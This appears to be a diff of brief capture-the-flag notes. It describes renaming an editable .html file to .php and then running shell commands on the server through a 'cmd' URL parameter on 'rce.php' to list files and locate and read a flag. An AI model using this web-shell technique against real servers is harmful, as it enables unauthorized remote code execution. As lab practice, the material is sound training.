@@ -14,4 +14,5 @@ since editing the file is an option, it means we can modify the name of it
 rename .html to .php and we are able to click on it
 we can also add cmd to the url for trying different commands
 files/rce.php?cmd=ls -l
+files/rce.php?cmd=find / -name flag.txt
 files/rce.php?cmd=cat/flag.txt
